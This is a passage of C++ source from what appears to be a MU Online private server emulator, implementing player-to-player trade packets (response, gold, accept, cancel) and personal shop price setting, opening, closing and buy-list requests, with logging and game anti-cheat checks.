				number, gObj[aIndex].AccountID, __FILE__, __LINE__);
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( OBJMAX_RANGE(number) == FALSE )
	{
		if ( gObj[aIndex].m_IfState.use != FALSE )
		{
			if ( gObj[aIndex].m_IfState.type == 1 )
			{
				gObj[aIndex].m_IfState.use = FALSE;
				gObj[aIndex].TargetNumber = -1;
			}
		}

		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("error-L1 : target:%d (A_ID:%s) %s %d",
		//LogAdd("error-L1 : target:%d (A_ID:%s) %s %d", 
			number, gObj[aIndex].AccountID, __FILE__, __LINE__);
		Result = FALSE;
		lpMsg->Response = false;
	}

	if(!(number >= OBJ_STARTUSERINDEX && number < OBJMAX))
	{		
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( gObjIsConnected(number) == FALSE )
	{
		Result = FALSE;
		lpMsg->Response = false;
	}
	
	if ( gObj[aIndex].CloseType != -1 )
	{
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( gObj[aIndex].m_bPShopOpen == true )
	{
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( gObj[number].m_bPShopOpen == true )
	{
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( gObj[aIndex].X < (gObj[number].X -2 ) || gObj[aIndex].X > (gObj[number].X +2 ) || gObj[aIndex].Y < (gObj[number].Y -2 ) || gObj[aIndex].Y > (gObj[number].Y +2 ) )
	{
		Result = FALSE;
		lpMsg->Response = false;
	}

	if ( gObj[aIndex].m_IfState.use == FALSE || gObj[aIndex].m_IfState.type != 1 || gObj[aIndex].m_IfState.state != 0 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("(%s)(%s) Trade Interface State Error : use:%d type:%d",
		//LogAddTD("(%s)(%s) Trade Interface State Error : use:%d type:%d",
				gObj[aIndex].AccountID, gObj[aIndex].Name, 
				gObj[aIndex].m_IfState.use, gObj[aIndex].m_IfState.type);

		return;
	}

	if ( gObj[number].m_IfState.use == FALSE || gObj[number].m_IfState.type != 1 || gObj[number].m_IfState.state != 0 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("(%s)(%s) Trade Interface State Error : use:%d type:%d", 
			//LogAddTD("(%s)(%s) Trade Interface State Error : use:%d type:%d", 
				gObj[number].AccountID, gObj[number].Name, 
				gObj[number].m_IfState.use, gObj[number].m_IfState.type);

		return;
	}

	if ( gObjFixInventoryPointer(aIndex) == false )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
			//LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[aIndex].pTransaction == 1 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("[%s][%s] CGTradeResponseRecv() Failed : Transaction == 1, IF_TYPE : %d",
			//LogAddTD("[%s][%s] CGTradeResponseRecv() Failed : Transaction == 1, IF_TYPE : %d",
				gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);

		return;
	}

	if ( lpMsg->Response == false )
	{
		GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name, 0, 0);
		Result = FALSE;
	}
	else
	{
		Result = TRUE;

		for ( int i=0;i<TRADE_BOX_SIZE;i++)
		{
			gObj[aIndex].Trade[i].Clear();
			gObj[number].Trade[i].Clear();
		}

		memset(gObj[aIndex].TradeMap, (BYTE)-1, TRADE_BOX_SIZE );
		memset(gObj[number].TradeMap, (BYTE)-1, TRADE_BOX_SIZE );
		gObj[aIndex].m_IfState.state = 1;
		gObj[number].m_IfState.state = 1;
		gObj[aIndex].TradeMoney = 0;
		gObj[number].TradeMoney = 0;

		if (::gObjInventoryTrans(aIndex) == FALSE )
			Result = 2;

		if (::gObjInventoryTrans(number) == FALSE )
			Result = 3;

		if ( Result != TRUE )
		{
			lpMsg->Response = false;
			GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name, 0, 0);
			GCTradeResponseSend(lpMsg->Response, aIndex, gObj[number].Name, 0, 0);

			if ( Result == 2 )
			{
				if(ReadConfig.TradeLog == TRUE)
					TRADE_LOG.Output("[%s][%s] Made Trade Error (in Transaction) [%s][%s]",
					//LogAddTD("[%s][%s] Made Trade Error (in Transaction) [%s][%s]",
						gObj[aIndex].AccountID, gObj[aIndex].Name,
						gObj[number].AccountID, gObj[number].Name);
			}
			else if ( Result == 3 )
			{
				if(ReadConfig.TradeLog == TRUE)
					TRADE_LOG.Output("[%s][%s] Made Trade Error (in Transaction) [%s][%s]",
					//LogAddTD("[%s][%s] Made Trade Error (in Transaction) [%s][%s]",
						gObj[number].AccountID, gObj[number].Name,
						gObj[aIndex].AccountID, gObj[aIndex].Name);
			}

			Result = FALSE;
		}
		else
		{
			lpMsg->Response = true;
			GCTradeResponseSend(lpMsg->Response, number, gObj[aIndex].Name, gObj[aIndex].Level, gObj[aIndex].GuildNumber);
			GCTradeResponseSend(lpMsg->Response, aIndex, gObj[number].Name, gObj[number].Level, gObj[number].GuildNumber);

			if(ReadConfig.TradeLog == TRUE)
				TRADE_LOG.Output("[%s][%s] Trade Ready [%s][%s]", 
				//LogAddTD("[%s][%s] Trade Ready [%s][%s]", 
					gObj[number].AccountID, gObj[number].Name,
					gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
	}

	if ( Result == FALSE )
	{
		if ( gObj[aIndex].m_IfState.use != FALSE && gObj[aIndex].m_IfState.type == 1 )
		{
			gObj[aIndex].m_IfState.use = FALSE;
			gObj[aIndex].TargetNumber = -1;
			if(ReadConfig.TradeLog == TRUE)
				TRADE_LOG.Output("[Trade][%s][%s] Interface State : %d",
					gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.use);
			//LogAddTD("Interface State : %d", gObj[aIndex].m_IfState.use);
		}

		if ( gObj[number].TargetNumber == aIndex )
		{
			if ( gObj[number].m_IfState.use != FALSE && gObj[number].m_IfState.type == 1 )
			{
				gObj[number].m_IfState.use = FALSE;
				gObj[number].TargetNumber = -1;
				if(ReadConfig.TradeLog == TRUE)
					TRADE_LOG.Output("[Trade][%s][%s] Interface State : %d",
						gObj[number].AccountID, gObj[number].Name, gObj[number].m_IfState.use);
				//LogAddTD("Interface State : %d", gObj[number].m_IfState.use);
			}
		}
	}
}






BOOL GCTradeResponseSend(BYTE response, int aIndex, LPSTR id, WORD level, int GuildNumber)
{
	PMSG_TRADE_RESPONSE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x37, sizeof(pMsg));
	pMsg.Response = response;
	pMsg.Level = level;
	pMsg.GuildNumber = GuildNumber;
	memcpy(pMsg.Id, id, sizeof(pMsg.Id));

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


struct PMSG_TRADE_OTHER_DEL
{
	PBMSG_HEAD h;	// C1:38
	BYTE TradeItemIndex;	// 3
};


int GCTradeOtherDel(int aIndex, BYTE tradeindex)
{
	PMSG_TRADE_OTHER_DEL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x38, sizeof(pMsg ));
	pMsg.TradeItemIndex = tradeindex;

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


struct PMSG_TRADE_OTHER_MOVE
{
	PBMSG_HEAD h;	// C1:39
	BYTE TradeItemIndex;	// 3
	BYTE ItemInfo[MAX_ITEM_INFO];	// 4
};



int GCTradeOtherAdd(int aIndex, BYTE tradeindex, LPBYTE iteminfo)
{
	PMSG_TRADE_OTHER_MOVE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x39, sizeof(pMsg));
	pMsg.TradeItemIndex = tradeindex;
	pMsg.ItemInfo[I_TYPE] = iteminfo[I_TYPE];
	pMsg.ItemInfo[I_OPTION] = iteminfo[I_OPTION];
	pMsg.ItemInfo[I_DUR] = iteminfo[I_DUR];
	pMsg.ItemInfo[I_NOPTION] = iteminfo[I_NOPTION];
	pMsg.ItemInfo[I_SOPTION] = iteminfo[I_SOPTION];
	pMsg.ItemInfo[5] = iteminfo[5];
	pMsg.ItemInfo[6] = iteminfo[6];

	pMsg.ItemInfo[7] = iteminfo[7];
	pMsg.ItemInfo[8] = iteminfo[8];
	pMsg.ItemInfo[9] = iteminfo[9];
	pMsg.ItemInfo[10] = iteminfo[10];
	pMsg.ItemInfo[11] = iteminfo[11];
	
	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}





void CGTradeMoneyRecv(PMSG_TRADE_GOLD * lpMsg, int aIndex)
{
	PMSG_DEFRESULT pMsg;
	int money = 0;
	int number;

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	if ( !OBJMAX_RANGE(aIndex) )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output("Error : [Trade] %s %d (%d)", __FILE__, __LINE__, aIndex);
		//LogAdd("error : %s %d (%d)", __FILE__, __LINE__, aIndex);
		return;
	}

	if ( gObj[aIndex].CloseType != -1 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output(lMsg.Get(MSGGET(1, 231)), gObj[aIndex].AccountID, gObj[aIndex].Name);
		//LogAdd(lMsg.Get(MSGGET(1, 231)), gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}

	number = gObj[aIndex].TargetNumber;

	if ( !OBJMAX_RANGE(number) )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output(lMsg.Get(MSGGET(1, 232)), gObj[aIndex].AccountID, gObj[aIndex].Name, number);
		//LogAdd(lMsg.Get(MSGGET(1, 232)), gObj[aIndex].AccountID, gObj[aIndex].Name, number);
		return;
	}

	if ( gObj[number].CloseType != -1 )
	{
		if(ReadConfig.TradeLog == TRUE)
			TRADE_LOG.Output(lMsg.Get(MSGGET(1, 233)), gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[number].AccountID, gObj[number].Name);
		//LogAdd(lMsg.Get(MSGGET(1, 233)), gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[number].AccountID, gObj[number].Name);
		return;
	}

	if ( gObj[aIndex].m_IfState.use == FALSE && gObj[aIndex].m_IfState.type != 1 )
		return;

	if ( ::gObjCanItemTouch(&gObj[aIndex], 1) == FALSE )
		return;

	if ( lpMsg->Money > 1000000000 )
		return;

	money = lpMsg->Money;

	if ( (gObj[aIndex].Money - money) < 0 )
		return;

	GCMoneySend(aIndex, gObj[aIndex].Money - money);

	PHeadSetB((LPBYTE)&pMsg, 0x3A, sizeof(pMsg));
	pMsg.result = 1;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

	if ( number >= 0)
	{
		gObj[aIndex].TradeMoney = money;
		gObj[aIndex].TradeOk  = false;
		gObj[number].TradeOk  = false;

		GCTradeOkButtonSend(number, 2);
		GCTradeOkButtonSend(aIndex, 0);
		GCTradeMoneyOther(number, gObj[aIndex].TradeMoney);
	}
}



struct PMSG_TRADE_OTHER_GOLD
{
	PBMSG_HEAD h;	// C1:3B
	DWORD Money;	// 4
};



BOOL GCTradeMoneyOther(int aIndex, DWORD money)
{
	PMSG_TRADE_OTHER_GOLD pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x3B, sizeof(pMsg));
	pMsg.Money = money;

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);	
}




BOOL GCTradeOkButtonSend(int aIndex, BYTE flag)
{
	PMSG_TRADE_OKBUTTON pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x3C, sizeof(pMsg));
	pMsg.Flag = flag;

	return DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

void CGTradeOkButtonRecv(PMSG_TRADE_OKBUTTON * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

#if (PACK_EDITION>=3)
	if ( BotAlchemist.IsInTrade(aIndex) == 1 && lpMsg->Flag == 1)
	{
		BotAlchemist.TradeOk(aIndex);
		return;
	}

	if ( BotTrader.IsInTrade(aIndex) == 1 && lpMsg->Flag == 1)
	{
		BotTrader.TradeOk(aIndex);
		return;
	}

	if( botPet.IsInTrade(aIndex) == 1 && lpMsg->Flag == 1)
	{
		botPet.OKTrade(aIndex);
		return;
	}
#endif

	int number = gObj[aIndex].TargetNumber;

	if ( number < 0 || number > OBJMAX-1 )
		return;

	if ( !gObjIsConnected(&gObj[number]))
		return;

	if ( gObj[aIndex].m_IfState.use < 1 || gObj[aIndex].m_IfState.state != 1 )
		return;

	if ( gObj[number].m_IfState.use < 1 || gObj[number].m_IfState.state != 1 )
		return;

	if ( gObj[aIndex].CloseType != -1 )
		return;

	if ( gObj[number].CloseType != -1 )
		return;

	if(ReadConfig.TradeAntiHack == 1)
	{
		//Trade Anti-Hack
		if ( (GetTickCount()-gObj[number].m_InterfaceTime < 5000)||(GetTickCount()-gObj[aIndex].m_InterfaceTime < 5000))
		{
			GCServerMsgStringSend("Trying to trade too soon after items change!", aIndex, 1);
			GCServerMsgStringSend("Trying to trade too soon after items change!", number, 1);

			if(ReadConfig.AHLog == TRUE)
			{
				ANTI_HACK_LOG.Output("[%s][%s] vs [%s][%s] Trade Too fast! [%d][%d]", 
					gObj[aIndex].AccountID, gObj[aIndex].Name,
					gObj[number].AccountID, gObj[number].Name,
					gObj[aIndex].m_InterfaceTime,gObj[number].m_InterfaceTime
				);
			}

			return;
		}
	}

	if ( lpMsg->Flag == 1 )
	{
		if ( gObj[aIndex].TradeOk == false )
		{
			gObj[aIndex].TradeOk = true;
			
			if(ReadConfig.TradeLog == TRUE)
				TRADE_LOG.Output("[%s][%s] Trade Accept", gObj[aIndex].AccountID, gObj[aIndex].Name);
			//LogAddTD("[%s][%s] Trade Accept", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCTradeOkButtonSend(number, 1);
		}
	}
	else if ( lpMsg->Flag == 0 )
	{
		if ( gObj[aIndex].TradeOk  == true )
		{
			GCTradeOkButtonSend(number, 0);
			gObj[aIndex].TradeOk = false;
		}
	}

	gObjTradeOkButton(aIndex);
}



void CGTradeCancelButtonRecv(int aIndex)
{
#if (PACK_EDITION>=3)

	if ( BotAlchemist.IsInTrade(aIndex) == 1)
	{
		BotAlchemist.TradeCancel(aIndex);
		return;
	}

	if ( BotTrader.IsInTrade(aIndex) == 1)
	{
		BotTrader.TradeCancel(aIndex);
		return;
	}

	if(botPet.IsInTrade(aIndex) == 1)
	{
		botPet.CancelTrade(aIndex);
		return;
	}
#endif

	int number = gObj[aIndex].TargetNumber;
	gObjTradeCancel(aIndex);
	CGTradeResult(aIndex, 0);

	if ( number >= 0 )
	{
		gObjTradeCancel(number);
		CGTradeResult(number, 0);
	}
}



struct PMSG_TRADE_RESULT
{
	PBMSG_HEAD h;	// C1:3D
	BYTE Result;	// 3
};



void CGTradeResult(int aIndex , BYTE result )
{
	PMSG_TRADE_RESULT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x3D, sizeof(pMsg));
	pMsg.Result = result;

	DataSend(aIndex, (unsigned char*)&pMsg, pMsg.h.size);
}






struct CG_REQ_PSHOP_SET_ITEM_PRICE
{
	PHEADSUBB PHeader;
	BYTE btSourcePos;
	BYTE dwItemPrice[4];
};



void CGPShopReqSetItemPrice(PMSG_REQ_PSHOP_SETITEMPRICE * lpMsg, int aIndex)
{
	if ( gDoPShopOpen  == FALSE )
	{
		CGPShopAnsSetItemPrice(aIndex, 0, lpMsg->btItemPos);
		return;
	}

	if ( !gObjIsConnected(aIndex))
	{
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d", aIndex);
		return;
	}

	if ( gObj[aIndex].Type != OBJ_USER )
	{
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

	if ( gObj[aIndex].Level <= 5 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Level is Under 6 : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Level);
		CGPShopAnsSetItemPrice(aIndex, 5, lpMsg->btItemPos);

		return;
	}

	if ( ReadConfig.INVENTORY_RANGE(aIndex,lpMsg->btItemPos,false) == FALSE )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Item Position Out of Bound : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, lpMsg->btItemPos);
		CGPShopAnsSetItemPrice(aIndex, 2, lpMsg->btItemPos);

		return;
	}

	if ( gObj[aIndex].Inventory1[lpMsg->btItemPos].IsItem() == FALSE )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Item Does Not Exist : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, lpMsg->btItemPos);
		CGPShopAnsSetItemPrice(aIndex, 3, lpMsg->btItemPos);

		return;
	}

	CItem * sitem = &gObj[aIndex].Inventory1[lpMsg->btItemPos];
	int iItemPrice = MAKE_NUMBERDW(MAKE_NUMBERW(lpMsg->sItemPrice4, lpMsg->sItemPrice3), MAKE_NUMBERW(lpMsg->sItemPrice2, lpMsg->sItemPrice1));

	if ( gObjCheckSerial0ItemList(sitem) != FALSE )
	{
		MsgOutput(aIndex, lMsg.Get(MSGGET(13, 26)));
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);

		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][Serial 0 Item] [PShop] (%s)(%s) Item(%s) Pos(%d)",
				gObj[aIndex].AccountID, gObj[aIndex].Name, sitem->GetName(), lpMsg->btItemPos);
		}

		return;
	}

	if(gObjCheckSerialSpecialItemList(sitem) != 0)
	{
		GCServerMsgStringSend("Can Not PShop Promo Items!", aIndex, 1);
		return;
	}

	if ( gObjInventorySearchSerialNumber(&gObj[aIndex], sitem->GetNumber()) == FALSE )
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, TRUE, gObj[aIndex].iShield);
		LogAdd("error-L2 : CopyItem [%s][%s] return %s %d", gObj[aIndex].AccountID, gObj[aIndex].Name, __FILE__, __LINE__);

		return;
	}

	if ( iItemPrice <= 0 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Personal Shop Item Price <= 0 : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, sitem->m_iPShopValue);
		CGPShopAnsSetItemPrice(aIndex, 4, lpMsg->btItemPos);

		return;
	}

	if ( (gObj[aIndex].Penalty&4) == 4 || (gObj[aIndex].Penalty&8) == 8 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Item Price Change - Item Block",gObj[aIndex].AccountID, gObj[aIndex].Name,sitem->m_iPShopValue);	// Deathway fix Here - Last parameter can cause crash
		CGPShopAnsSetItemPrice(aIndex, 6	, lpMsg->btItemPos);

		return;
	}

	sitem->m_iPShopValue = iItemPrice;
	ItemAttribute[sitem->m_Type].Name[31] = 0;	// Zero String Terminated

	LogAddTD("[PShop] [%s][%s] Changing Item Price : %d (Type:%d (%s), Lev:%d, Serial:%d, Dur:%d",
		gObj[aIndex].AccountID, gObj[aIndex].Name, sitem->m_iPShopValue, sitem->m_Type, 
		ItemAttribute[sitem->m_Type].Name, sitem->m_Level, sitem->m_Number,
		sitem->m_Durability);

	CGPShopAnsSetItemPrice(aIndex, 1	, lpMsg->btItemPos);
}




struct PMSG_ANS_PSHOP_SETITEMPRICE
{
	PBMSG_HEAD2 h;	// C1:3F:01
	BYTE btResult;	// 4
	BYTE btItemPos;	// 5
};


void CGPShopAnsSetItemPrice(int aIndex, BYTE btResult, BYTE btItemPos)
{
	PMSG_ANS_PSHOP_SETITEMPRICE pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x01, sizeof(pMsg));
	pMsg.btResult = btResult;
	pMsg.btItemPos = btItemPos;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}





struct PMSG_ANS_PSHOP_TEXT_CHANGED
{
	PBMSG_HEAD2 h;	// C1:3F:10
	BYTE NumberH;	// 4
	BYTE NumberL;	// 5
	BYTE btPShopText[36];	// 6
	BYTE btName[10];	// 2A
};


void CGPShopReqOpen(PMSG_REQ_PSHOP_OPEN * lpMsg, int aIndex)
{
	if ( ::gDoPShopOpen == FALSE )
		return;

	if ( !gObjIsConnected(aIndex))
	{
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d",aIndex);
		return;
	}

	if ( gObj[aIndex].Type != OBJ_USER )
	{
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

	if ( gObj[aIndex].Level <= 5 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Level is Under 6 : %d",
			gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].Level);
		::CGPShopAnsOpen( aIndex, 2);

		return;
	}

	if ( (gObj[aIndex].Penalty&4) == 4 || (gObj[aIndex].Penalty&8) == 8 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Cant't Open Shop - Item Block" ,gObj[aIndex].AccountID, gObj[aIndex].Name);
		::CGPShopAnsOpen( aIndex, 3);

		return;
	}	

	if ( CC_MAP_RANGE(gObj[aIndex].MapNumber) )
	{
		::GCServerMsgStringSend(lMsg.Get(MSGGET(4, 197)), aIndex, 1);
		::CGPShopAnsOpen( aIndex, 0);

		return;
	}	

	bool bEnablePShopOpen = false;

	if ( gObj[aIndex].m_IfState.use == FALSE )
		bEnablePShopOpen  = true;
	else
	{
		if ( gObj[aIndex].m_IfState.use == TRUE )
		{
			switch ( gObj[aIndex].m_IfState.type )
			{
				case 8:
					bEnablePShopOpen = true; break;
			}

			if ( !bEnablePShopOpen  )
			{
				LogAddTD("[PShop] [%s][%s] ERROR : m_IfState.type is Using : %d", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);
			}
		}
		else
		{
			LogAddTD("[PShop] [%s][%s] ERROR : Unknown m_IfState.type : %d", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);
			return;
		}
	}

	if ( !::gObjFixInventoryPointer(aIndex))
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__ ,__LINE__);
	}

	if ( gObj[aIndex].pTransaction == 1 )
	{
		LogAddTD("[PShop] [%s][%s] ERROR : Transaction == 1, IF_TYPE : %d", gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].m_IfState.type);
		bEnablePShopOpen = false;
	}

	if ( bEnablePShopOpen )
	{
		if ( gObj[aIndex].m_bPShopOpen == false )
		{
			if (ReadConfig.AllowPShopOnlyInLMarket == 1 && 
				gObj[aIndex].MapNumber != MAP_INDEX_LORRENMARKET)
			{				
				GCServerMsgStringSend("You can open PShop only in Loren Market!",aIndex, 0x01);
				return;
			}
			gObj[aIndex].m_bPShopOpen = true;
			memcpy(gObj[aIndex].m_szPShopText, lpMsg->szPShopText, sizeof(lpMsg->szPShopText));
			LogAddTD("[PShop] [%s][%s] Personal Shop Opened", gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		else
		{
			memcpy(gObj[aIndex].m_szPShopText, lpMsg->szPShopText, sizeof(lpMsg->szPShopText));
			
			PMSG_ANS_PSHOP_TEXT_CHANGED pMsg;

			PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x10, sizeof(pMsg));
			pMsg.NumberH = SET_NUMBERH(aIndex);
			pMsg.NumberL = SET_NUMBERL(aIndex);
			memcpy(pMsg.btPShopText, lpMsg->szPShopText, sizeof(pMsg.btPShopText));
			memcpy(pMsg.btName, gObj[aIndex].Name, sizeof(pMsg.btName));

			MsgSendV2(&gObj[aIndex], (LPBYTE)&pMsg, pMsg.h.size);

			LogAddTD("[PShop] [%s][%s] Personal Shop Already Opened - Changing PShop Name",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
	}
	else
	{
		CGPShopAnsOpen(aIndex, 0);
		return;
	}
	
	CGPShopAnsOpen(aIndex, 1);
}




struct PMSG_ANS_PSHOP_OPEN
{
	PBMSG_HEAD2 h;	// C1:3F:02
	BYTE btResult;	// 4
};


void CGPShopAnsOpen(int aIndex, BYTE btResult)
{
	PMSG_ANS_PSHOP_OPEN pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x02, sizeof(pMsg));
	pMsg.btResult = btResult;

	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}




void CGPShopReqClose(int aIndex)
{
	if ( !gObjIsConnected(aIndex))
	{
		LogAddTD("[PShop] ERROR : Index is not CONNECTED : %d", aIndex);
		return;
	}

	if ( gObj[aIndex].Type != OBJ_USER )
	{
		LogAddTD("[PShop] ERROR : Index is not CHARACTER : %d", aIndex);
		return;
	}

	LogAddTD("[PShop] [%s][%s] Requested to Close PShop", gObj[aIndex].AccountID, gObj[aIndex].Name);
	gObj[aIndex].m_bPShopOpen = false;
	memset(gObj[aIndex].m_szPShopText, 0, sizeof(gObj[aIndex].m_szPShopText));
	CGPShopAnsClose(aIndex, 1);
}




struct PMSG_ANS_PSHOP_CLOSE
{
	PBMSG_HEAD2 h;	// C1:3F:03
	BYTE btResult;	// 4
	BYTE NumberH;	// 5
	BYTE NumberL;	// 6
};


void CGPShopAnsClose(int aIndex, BYTE btResult)
{
	LogAddTD("[PShop] [%s][%s] Close PShop", gObj[aIndex].AccountID, gObj[aIndex].Name);

	PMSG_ANS_PSHOP_CLOSE pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x03, sizeof(pMsg));
	pMsg.btResult = btResult;
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);

	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));

	if ( btResult == 1 )
		MsgSendV2(&gObj[aIndex], (LPBYTE)&pMsg, pMsg.h.size);
}





void CGPShopReqBuyList(PMSG_REQ_BUYLIST_FROM_PSHOP * lpMsg, int aSourceIndex)
{
	if ( ::gDoPShopOpen == FALSE )
		return;

	if ( gObjIsConnected(MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)) == FALSE)
	{
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Seller did Not CONNECTED (%d)",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		::CGPShopAnsBuyList(aSourceIndex, -1, 2, 0);
		return;
	}

	if(OBJMAX_RANGE(aSourceIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL)];

	if ( lpObj->Type != OBJ_USER 
#if (PACK_EDITION>=3)
		&& lpObj->IsBot != 4
#endif
		)
	{
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Seller is Not CHARACTER (%d)"
			,gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		::CGPShopAnsBuyList(aSourceIndex, -1, 2, 0);
		return;
	}

	if ( lpObj->CloseCount >= 0 )	
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Seller is Closing (%d)"
			,gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL) );
		CGPShopAnsBuyItem(aSourceIndex, -1, 0,2);
		return;
	}

	if ( gObj[aSourceIndex].CloseCount >= 0 )	
	{
		LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : Buyer is Closing (%d)",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,  MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL));
		CGPShopAnsBuyItem(aSourceIndex, -1, 0, 2);
		return;
	}

	if ( lpObj->m_bMapSvrMoveQuit == true || lpObj->m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][PShop] - PShop Item Buy during MapServer Move: Seller [%s][%s]",
				lpObj->AccountID, lpObj->Name);
		}
		return;
	}

	if ( gObj[aSourceIndex].m_bMapSvrMoveQuit == true || gObj[aSourceIndex].m_bMapAntiHackMove == true )
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][PShop] - PShop Item Buy during MapServer Move: Buyer [%s][%s]",
				gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name);
		}
		return;
	}

	if ( lpObj->m_Index == aSourceIndex )
	{
		LogAddTD("[PShop] [%s][%s] PShop List Requested to Him(/Her)Self",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name);
		::CGPShopAnsBuyList(aSourceIndex, -1, 2, 0);
		return;
	}

	if ( lpObj->m_bPShopOpen == false )
	{
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : [%s][%s] Did not Open PShop",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyList(aSourceIndex, -1, 3, 0);
		return;
	}

	if ( (lpObj->Penalty &4) == 4 || (lpObj->Penalty&8) == 8 )
	{
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : [%s][%s] is in Item Block",
			gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
			lpObj->AccountID, lpObj->Name);
		::CGPShopAnsBuyList(aSourceIndex, -1, 4, 0);
		return;
	}

	if ( !::gObjFixInventoryPointer(aSourceIndex))
	{
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}

	if ( gObj[aSourceIndex].pTransaction == 1 )
	{
		LogAddTD("[PShop] [%s][%s] PShop List Request Failed : Requester Transaction == 1, IF_TYPE : %d",
